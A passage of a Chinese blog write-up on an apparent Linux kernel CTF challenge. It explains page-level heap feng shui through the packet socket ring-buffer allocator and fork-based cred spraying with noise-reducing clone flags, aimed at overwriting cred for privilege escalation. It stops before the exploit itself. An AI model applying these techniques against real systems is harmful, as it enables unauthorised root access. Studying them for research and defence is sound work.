<span class="hljs-comment">//标志着每个block中私有区域的大小</span><br> <br>	...<br>	<br>	<span class="hljs-type">char</span>		*nxt_offset; 			<span class="hljs-comment">//指向活动block内， 同时指向下一个packet保存的地方</span><br>	<br>	...<br>	<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> <span class="hljs-title">retire_blk_timer</span>;</span> 	<span class="hljs-comment">//描述了在超时时退出当前块的定时器</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">timer_list</span> &#123;</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">hlist_node</span>	<span class="hljs-title">entry</span>;</span><br>	<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>		expires;<br>	<span class="hljs-type">void</span>			(*function)(<span class="hljs-keyword">struct</span> timer_list *);<br>	u32			flags;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_LOCKDEP</span><br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">lockdep_map</span>	<span class="hljs-title">lockdep_map</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure>

<h4 id="packet-set-ring-创建ring-buffer"><a href="#packet-set-ring-创建ring-buffer" class="headerlink" title="packet_set_ring()创建ring buffer"></a><code>packet_set_ring()</code>创建ring buffer</h4><p>我们一般可以通过 <code>packet_setsocketopt</code>函数并且附带特定的socket选项来进行处理socket事件，例如使用 <code>PACKET_VERSION</code>选项来设置环形缓冲区版本</p>
<p>当我们设置 <code>PACKET_RX_RING</code>来创建负责接收的环形缓冲区，其最终会使用 <code>packet_set_ring()</code>函数来进行处理，如下是较为重要部分</p>
<p>首先他会进行一系列检查</p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs xl">err = -EINVAL;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely((int)req-&gt;</span>tp_block_size &lt;= <span class="hljs-number">0</span>))<br>			goto out;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely(!PAGE_ALIGNED(req-&gt;</span>tp_block_size)))<br>			goto out;<br>		<span class="hljs-function"><span class="hljs-title">min_frame_size</span> = po-&gt;</span><span class="hljs-function"><span class="hljs-title">tp_hdrlen</span> + po-&gt;</span>tp_reserve;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (po-&gt;</span>tp_version &gt;= TPACKET_V3 &amp;&amp;<br>		    <span class="hljs-function"><span class="hljs-title">req</span>-&gt;</span>tp_block_size &lt;<br>		    BLK_PLUS_PRIV((<span class="hljs-function"><span class="hljs-title">u64</span>)req_u-&gt;</span>req3.tp_sizeof_priv) + min_frame_size)<br>			goto out;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely(req-&gt;</span>tp_frame_size &lt; min_frame_size))<br>			goto out;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely(req-&gt;</span>tp_frame_size &amp; (TPACKET_ALIGNMENT - <span class="hljs-number">1</span>)))<br>			goto out;<br><br>		<span class="hljs-function"><span class="hljs-title">rb</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">frames_per_block</span> = req-&gt;</span><span class="hljs-function"><span class="hljs-title">tp_block_size</span> / req-&gt;</span>tp_frame_size;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely(rb-&gt;</span>frames_per_block == <span class="hljs-number">0</span>))<br>			goto out;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely(rb-&gt;</span><span class="hljs-function"><span class="hljs-title">frames_per_block</span> &gt; UINT_MAX / req-&gt;</span>tp_block_nr))<br>			goto out;<br>		<span class="hljs-function"><span class="hljs-title">if</span> (unlikely((rb-&gt;</span><span class="hljs-function"><span class="hljs-title">frames_per_block</span> * req-&gt;</span>tp_block_nr) !=<br>					<span class="hljs-function"><span class="hljs-title">req</span>-&gt;</span>tp_frame_nr))<br>			goto out;<br><br></code></pre></td></tr></table></figure>

<p>然后就会为环形缓冲区分配 <code>block</code></p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">err = -ENOMEM;<br>		<span class="hljs-keyword">order</span> = get_order(req-&gt;tp_block_size);<br>		pg_vec = alloc_pg_vec(req, <span class="hljs-keyword">order</span>);<br>		<span class="hljs-keyword">if</span> (unlikely(!pg_vec))<br>			goto <span class="hljs-keyword">out</span>;<br></code></pre></td></tr></table></figure>

<p>该 <code>alloc_pg_vec</code>函数实际上调用了内核当中的内存分配函数,这里注意是 <code>block_nr</code>个 咱们提供的 <code>order</code>大小,这里的order取决于咱们的 <code>tp_block_size</code>  ，也就是 BitsByWill师傅提到他的原因</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-type">static</span> <span class="hljs-keyword">struct</span> <span class="hljs-title class_">pgv</span> *<span class="hljs-built_in">alloc_pg_vec</span>(<span class="hljs-keyword">struct</span> tpacket_req *req, <span class="hljs-type">int</span> order)<br>&#123;<br>	...<br><br>	pg_vec = <span class="hljs-built_in">kcalloc</span>(block_nr, <span class="hljs-built_in">sizeof</span>(<span class="hljs-keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);<br>	<span class="hljs-keyword">if</span> (<span class="hljs-built_in">unlikely</span>(!pg_vec))<br>		<span class="hljs-keyword">goto</span> out;<br><br>	<span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; block_nr; i++) &#123;<br>		pg_vec[i].buffer = <span class="hljs-built_in">alloc_one_pg_vec_page</span>(order);<br>	<br>	...<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span></span><br><span class="hljs-function"></span>&#123;<br>	<span class="hljs-type">char</span> *buffer;<br>	<span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>			  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>	buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br>	<span class="hljs-keyword">if</span> (buffer)<br>		<span class="hljs-keyword">return</span> buffer;<br>	<br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<p>在最后 <code>packet_set_ring()</code>函数会调用 <code>init_prb_bdqc()</code>函数</p>
<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">switch (po-&gt;tp_version) &#123;<br>case TPACKET_V3:<br>	<span class="hljs-comment">/* Block transmit is not supported yet */</span><br>	<span class="hljs-keyword">if</span> (!tx_ring) &#123;<br>		init<span class="hljs-constructor">_prb_bdqc(<span class="hljs-params">po</span>, <span class="hljs-params">rb</span>, <span class="hljs-params">pg_vec</span>, <span class="hljs-params">req_u</span>)</span>;<span class="hljs-operator"></span><br><span class="hljs-operator">	</span><br><span class="hljs-operator">	...</span><br><span class="hljs-operator">	</span><br><span class="hljs-operator"></span>&#125;<br></code></pre></td></tr></table></figure>

<p><code>init_prb_bdqc</code>函数的功能是将环形缓冲区的参数复制到 <code>sturct pack_ring_buffer.prb_bdqc</code>字段，根据计算设置参数，然后设置 <code>block retire timer</code>,最后调用 <code>prb_open_block</code>函数来初始化第一个 <code>block</code></p>
<figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs xl">static void init_prb_bdqc(struct packet_sock *po,<br>			struct packet_ring_buffer *rb,<br>			struct pgv *pg_vec,<br>			union tpacket_req_u *req_u)<br>&#123;<br>	struct tpacket_kbdq_core *p1 = GET_PBDQC_FROM_RB(rb);<br>	struct tpacket_block_desc *pbd;<br><br>	memset(p1, <span class="hljs-number">0</span>x0, sizeof(*p1));<br><br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>knxt_seq_num = <span class="hljs-number">1</span>;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>pkbdq = pg_vec;<br>	pbd = (struct tpacket_block_desc *)pg_vec[<span class="hljs-number">0</span>].buffer;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>pkblk_start	= pg_vec[<span class="hljs-number">0</span>].buffer;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">kblk_size</span> = req_u-&gt;</span>req3.tp_block_size;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">knum_blocks</span>	= req_u-&gt;</span>req3.tp_block_nr;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">hdrlen</span> = po-&gt;</span>tp_hdrlen;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">version</span> = po-&gt;</span>tp_version;<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>last_kactive_blk_num = <span class="hljs-number">0</span>;<br>	<span class="hljs-function"><span class="hljs-title">po</span>-&gt;</span>stats.stats3.tp_freeze_q_cnt = <span class="hljs-number">0</span>;<br>	<span class="hljs-function"><span class="hljs-title">if</span> (req_u-&gt;</span>req3.tp_retire_blk_tov)<br>		<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">retire_blk_tov</span> = req_u-&gt;</span>req3.tp_retire_blk_tov;<br>	<span class="hljs-keyword">else</span><br>		<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span>retire_blk_tov = prb_calc_retire_blk_tmo(po,<br>						<span class="hljs-function"><span class="hljs-title">req_u</span>-&gt;</span>req3.tp_block_size);<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">tov_in_jiffies</span> = msecs_to_jiffies(p1-&gt;</span>retire_blk_tov);<br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">blk_sizeof_priv</span> = req_u-&gt;</span>req3.tp_sizeof_priv;<br>	<span class="hljs-function"><span class="hljs-title">rwlock_init</span>(&amp;p1-&gt;</span>blk_fill_in_prog_lock);<br><br>	<span class="hljs-function"><span class="hljs-title">p1</span>-&gt;</span><span class="hljs-function"><span class="hljs-title">max_frame_len</span> = p1-&gt;</span><span class="hljs-function"><span class="hljs-title">kblk_size</span> - BLK_PLUS_PRIV(p1-&gt;</span>blk_sizeof_priv);<br>	prb_init_ft_ops(p1, req_u);<br>	prb_setup_retire_blk_timer(po);<br>	prb_open_block(p1, pbd);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>而 <code>prb_open_block()</code>函数中实现的一个功能就是将 <code>struct tpacket_kbdq_core-&gt;nxt_offset</code>设置在每个块私有区域之后</p>
<figure class="highlight rust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs rust"><span class="hljs-keyword">static</span> void <span class="hljs-title function_ invoke__">prb_open_block</span>(<span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_kbdq_core</span> *pkc1,<br>	<span class="hljs-keyword">struct</span> <span class="hljs-title class_">tpacket_block_desc</span> *pbd1)<br>&#123;<br>	...<br><br>	pkc1<span class="hljs-punctuation">-&gt;</span>pkblk_start = (<span class="hljs-type">char</span> *)pbd1;<br>	pkc1<span class="hljs-punctuation">-&gt;</span>nxt_offset = pkc1<span class="hljs-punctuation">-&gt;</span>pkblk_start + <span class="hljs-title function_ invoke__">BLK_PLUS_PRIV</span>(pkc1<span class="hljs-punctuation">-&gt;</span>blk_sizeof_priv);<br><br>	...<br>&#125;<br></code></pre></td></tr></table></figure>

<hr>
<p>以上我们就得到了一个内核当中以页为单位的分配原语，这有利于我们进行页级的堆风水</p>
<p>值得注意的是，在BitsByWill师傅的博客中并没有完全采取当初p0团队的分配方式，其中不同的点就是该<a target="_blank" rel="noopener" href="https://www.willsroot.io/2022/08/reviving-exploits-against-cred-struct.html">wp</a>当中使用的是 <code>TPACKET_V1/TPACKET_V2</code>，并且在创建 <code>ring buffer</code>的时候创建的是 <code>PACKET_TX_RING</code>类型的缓冲区，该缓冲区同 <code>PACKET_RX_RING</code>的区别在上面代码注释提了一嘴，但是这并不会影响我们的页分配，如下是我们 <code>packet_setsockopt()</code>部分源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">case</span> PACKET_RX_RING:<br><span class="hljs-keyword">case</span> PACKET_TX_RING:<br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">tpacket_req_u</span> <span class="hljs-title">req_u</span>;</span><br>	<span class="hljs-type">int</span> len;<br><br>	lock_sock(sk);<br>	<span class="hljs-keyword">switch</span> (po-&gt;tp_version) &#123;<br>	<span class="hljs-keyword">case</span> TPACKET_V1:<br>	<span class="hljs-keyword">case</span> TPACKET_V2:<br>		len = <span class="hljs-keyword">sizeof</span>(req_u.req);<br>		<span class="hljs-keyword">break</span>;<br>	<span class="hljs-keyword">case</span> TPACKET_V3:<br>	<span class="hljs-keyword">default</span>:<br>		len = <span class="hljs-keyword">sizeof</span>(req_u.req3);<br>		<span class="hljs-keyword">break</span>;<br>	&#125;<br>	<span class="hljs-keyword">if</span> (optlen &lt; len) &#123;<br>		ret = -EINVAL;<br>	&#125; <span class="hljs-keyword">else</span> &#123;<br>		<span class="hljs-keyword">if</span> (copy_from_sockptr(&amp;req_u.req, optval, len))<br>			ret = -EFAULT;<br>		<span class="hljs-keyword">else</span><br>			ret = packet_set_ring(sk, &amp;req_u, <span class="hljs-number">0</span>,<br>					    optname == PACKET_TX_RING);<br>	&#125;<br>	release_sock(sk);<br>	<span class="hljs-keyword">return</span> ret;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>可以看到这俩区别在分配的时候不大，最后仍是调用了 <code>packet_set_ring</code>函数，后面的步骤在上面也已经讲解就不多说了</p>
<p>这里需要额外提一下，因为我们直接是调用到了page分配这层，因此我们提供的是 <code>order</code>，而这个order是由我们最开始传入的 <code>(struct tpacket_req_u)req_u-&gt;req-&gt;tp_block_size</code>来决定的，根据 <code>packet_setsockopt()</code>进行分析不难得出这一点</p>
<p>而我们如果说要释放掉我们分配的 <code>block_nr</code>个相应 <code>order</code>的block,只需要简单的关闭对应 <code>socket</code>的fd指针即可,但是这里仍然会存在一个问题</p>
<blockquote>
<p>The only issue is that default low privileged users can’t utilize these functions in the root namespace</p>
</blockquote>
<p>也就是说默认的低特权用户不能在root命名空间下用到上面这些函数，但我们通常可以在许多linux系统中创建自己的非特权用户命名空间。虽然说我们仍然可以通过大量堆喷某个数据结构来耗尽我们某个 <code>order</code>下free_list的block， 典型的例子就是常用的 <code>msg_msg</code>了，但他使用通用 <code>slab</code>进行分配不太可靠，最重要的是本题禁止用它了已经 :^(</p>
<h4 id="初步构造思路"><a href="#初步构造思路" class="headerlink" title="初步构造思路"></a>初步构造思路</h4><p>出题人给出了一个十分优雅的提权手法，那就是修改 <code>cred</code>,他的好处在于根本不用担心 <code>KASLR</code>,泄露地址，构造ROP链等等，我们都知道在现如今的版本， <code>cred</code>位于一个独立的 <code>kmem_cache</code>当中，名叫 <code>cred_jar</code>，我们可以首先耗尽该 <code>cred_jar</code>，因此未来他将使得分配器从伙伴系统 <code>order_0</code>处分配页面,并且将高阶 <code>order</code>的block进行拆解分配 ，这里我们需要free掉一部分，以免他们进行合并返回高阶 <code>order_*</code>，然后我们需要再次堆喷 <code>cred</code>,然后我们再次释放一些pages,之后再次堆喷攻击对象，并且至少要有一个攻击对象需要在 <code>cred</code>所在slab的正上方</p>
<p>那么该如何大量堆喷 <code>cred</code>结构体呢，我们只需要通过 <code>fork</code>大量创建子进程即可，虽说在 <code>fork</code>的过程中会产生大量噪音(分配过程中对其他无关对象的分配),但作者说这并不影响他们这个初始化堆喷的过程</p>
<h4 id="fork中噪声的处理"><a href="#fork中噪声的处理" class="headerlink" title="fork中噪声的处理"></a><code>fork</code>中噪声的处理</h4><p>在构造页级堆风水的过程当中，对于内存的分配十分严格，因此我们需要尽量减少噪声对于我们的干扰</p>
<p>在 <code>fork</code>的过程当中，最为核心的函数就是 <code>kernel_clone</code>,我们需要牢记这一点，如果我们在传统 <code>fork</code>调用的过程当中没有设置任何 <code>kernel_clone_args</code>的flag参数，那么就会出现以下步骤：</p>
<ol>
<li><p><code>kernel_clone_args()</code>函数调用 <code>copy_process()</code>函数</p>
</li>
<li><p><code>copy_process()</code>函数调用 <code>dup_task_truct()</code>函数，他将从目标内核系统中 <code>order_2</code>分配出一个 <code>task_struct</code>数据结构，然后 <code>dup_task_struct()</code> 调用 <code>alloc_thread_stack_node()</code>,如果说没有缓存栈可用的化，那么这个函数将使用 <code>__vmalloc_node_range</code>来分配一个虚拟连续的16kb区域来作为内核线程栈，这里通常会需要分配四个 <code>order_0</code>的pages</p>
</li>
<li><p>上面的 <code>vmalloc</code>将会分配一个 <code>kmalloc-64</code>的chunk来帮助建立vmalloc虚拟映射，然后，内核将会从 <code>vmap_area_cachep</code> 分配两个 <code>vmap_area</code> chunk。在这个系统和内核当中，第一个是从 <code>alloc_vmap_area</code>当中分配,第二个可能是从 <code>preload_this_cpu_lock</code>中分配</p>
</li>
<li><p>然后 <code>copy_process()</code>函数将会调用 <code>call_creds()</code>,他将会触发从 <code>prepare_creds()</code>中对于 <code>creds</code>的分配，这里如果设置了 <code>CLONE_THREAD</code>参数的化就不会发生这一步 </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">copy_creds</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> task_struct *p, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> clone_flags)</span><br>&#123;<br>	<span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">cred</span> *<span class="hljs-title">new</span>;</span><br>	<span class="hljs-type">int</span> ret;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS_REQUEST_CACHE</span><br>	p-&gt;cached_requested_key = <span class="hljs-literal">NULL</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>	<span class="hljs-keyword">if</span> (<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KEYS</span><br>		!p-&gt;cred-&gt;thread_keyring &amp;&amp;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>		clone_flags &amp; CLONE_THREAD<br>	    ) &#123;<br>		p-&gt;real_cred = get_cred(p-&gt;cred);<br>		get_cred(p-&gt;cred);<br>		alter_cred_subscribers(p-&gt;cred, <span class="hljs-number">2</span>);<br>		kdebug(<span class="hljs-string">&quot;share_creds(%p&#123;%d,%d&#125;)&quot;</span>,<br>		       p-&gt;cred, <span class="hljs-type">atomic_read</span>(&amp;p-&gt;cred-&gt;usage),<br>		       read_cred_subscribers(p-&gt;cred));<br>		inc_rlimit_ucounts(task_ucounts(p), UCOUNT_RLIMIT_NPROC, <span class="hljs-number">1</span>);<br>		<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>	&#125;<br><br>	new = prepare_creds();<br><br>...<br><br></code></pre></td></tr></table></figure>
</li>
<li><p>在这之后 <code>copy_process()</code>函数开启了一系列 <code>copy_*()</code>函数，这个*是一系列进程所需要的资源，而这些函数便会触发内存的分配，除非设置了其各自的 <code>CLONE</code>标志，在平常的 <code>fork</code>当中，人们更希望从 <code>files_cache</code>,<code>fs_cache</code>,<code>sighand_cahe</code> 和 <code>signal_cache</code>当中分配新的chunk。其中最大的噪音是当没有设置 <code>CLONE_VM</code>标志位时建立<code>mm_struct</code>而产生的，而这反而会在 <code>vm_area_struct,anon_vma_chain</code>和 <code>anon_vma</code>等缓存当中触发大量内存分配活动，而这里所有分配都由该系统上的 <code>order_0</code>页面支持</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_audit;<br>	retval = copy_semundo(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_security;<br>	retval = copy_files(clone_flags, p, args-&gt;no_files);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_semundo;<br>	retval = copy_fs(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_files;<br>	retval = copy_sighand(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_fs;<br>	retval = copy_signal(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_sighand;<br>	retval = copy_mm(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_signal;<br>	retval = copy_namespaces(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_mm;<br>	retval = copy_io(clone_flags, p);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_namespaces;<br>	retval = copy_thread(p, args);<br>	<span class="hljs-keyword">if</span> (retval)<br>		<span class="hljs-keyword">goto</span> bad_fork_cleanup_io;<br><br></code></pre></td></tr></table></figure>
</li>
<li><p>最后，内核将分配出一个 pid chunk，其中所属的 <code>slab</code>也来自于 <code>order_0</code></p>
</li>
</ol>
<p>下面便是忽略vmalloc，仅仅专注于 <code>slab</code>分配的情况下，单一一个 <code>fork</code>调用在这个系统当中将会触发的分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c">task_struct<br>kmalloc<span class="hljs-number">-64</span><br>vmap_area<br>vmap_area<br>cred_jar<br>files_cache<br>fs_cache<br>sighand_cache<br>signal_cache<br>mm_struct<br>vm_area_struct<br>vm_area_struct<br>vm_area_struct<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>anon_vma_chain<br>anon_vma<br>anon_vma_chain<br>vm_area_struct<br>vm_area_struct<br>pid<br></code></pre></td></tr></table></figure>

<p>可以看到确实产生了很多噪音，在经过 <code>BitsByWill</code>师傅分析源码还有查看clone手册的努力下(bushi，使用以下的flag能极大的降低fork当中产生的噪音：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND<br></code></pre></td></tr></table></figure>

<p>当设置了这些flags之后，我们产生的噪音将会降低至下述情况</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">task_struct</span><br><span class="hljs-attribute">kmalloc</span>-<span class="hljs-number">64</span><br><span class="hljs-attribute">vmap_area</span><br><span class="hljs-attribute">vmap_area</span><br><span class="hljs-attribute">cred_jar</span><br><span class="hljs-attribute">signal_cache</span><br><span class="hljs-attribute">pid</span><br></code></pre></td></tr></table></figure>

<p>注意到这里仍然会由来自于 <code>vmalloc</code>的4个order_0的page。但这对于我们来说是可以接受的。这里还存在的问题是我们的子进程无法真正写入任何进程内存，因为它和父进程共享相同的虚拟内存，所以我们必须使用仅依赖于寄存器的shellcode来检查权限提升是否成功</p>
<h3 id="4-漏洞利用-2"><a href="#4-漏洞利用-2" class="headerlink" title="4.漏洞利用"></a>4.漏洞利用</h3><p>经过上述一大堆知识的铺垫，现在开始考虑该漏洞的利用,以下是利用的概述</p>
<ol>
